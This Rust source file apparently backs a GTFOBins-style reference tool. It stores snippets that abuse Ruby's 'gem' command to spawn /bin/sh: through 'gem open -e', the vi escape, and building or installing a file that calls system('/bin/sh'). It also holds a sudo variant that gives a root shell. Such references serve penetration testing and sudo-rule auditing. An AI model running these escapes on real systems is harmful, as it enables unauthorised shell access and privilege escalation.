pub static BIN_NAME: &'static str = "gem";
pub static SH_DESC_1: &'static str =
    "This requires the name of an installed gem to be provided (`rdoc` is usually installed).";
pub static SH_CODE_1: &'static str = r#"
    
    gem open -e "/bin/sh -c /bin/sh" rdoc
"#;
pub static SH_DESC_2: &'static str = "This invokes the default editor, which is likely to be `vi`, other functions may apply. This requires the name of an installed gem to be provided (`rdoc` is usually installed).";
pub static SH_CODE_2: &'static str = r#"
    
    gem open rdoc
    :!/bin/sh
"#;
pub static SH_DESC_3: &'static str = "This executes the specified file as `ruby` code.";
pub static SH_CODE_3: &'static str = r#"
    
    TF=$(mktemp -d)
    echo 'system("/bin/sh")' > $TF/x
    gem build $TF/x
"#;
pub static SH_DESC_4: &'static str = "This executes the specified file as `ruby` code.";
pub static SH_CODE_4: &'static str = r#"
    
    TF=$(mktemp -d)
    echo 'system("/bin/sh")' > $TF/x
    gem install --file $TF/x
"#;
pub static SUDO_DESC: &'static str =
    "This requires the name of an installed gem to be provided (`rdoc` is usually installed).";
pub static SUDO_CODE: &'static str = r#"
    
    sudo gem open -e "/bin/sh -c /bin/sh" rdoc
"#;
use crate::code::{Code, Tag};
pub static SH_1: Code<'static> = Code {
    title: "SH_CODE_1",
    code: SH_CODE_1,
    tag: Tag::SH,
};
pub static SH_2: Code<'static> = Code {
    title: "SH_CODE_2",
    code: SH_CODE_2,
    tag: Tag::SH,
};
pub static SH_3: Code<'static> = Code {
    title: "SH_CODE_3",
    code: SH_CODE_3,
    tag: Tag::SH,
};
pub static SH_4: Code<'static> = Code {
    title: "SH_CODE_4",
    code: SH_CODE_4,
    tag: Tag::SH,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
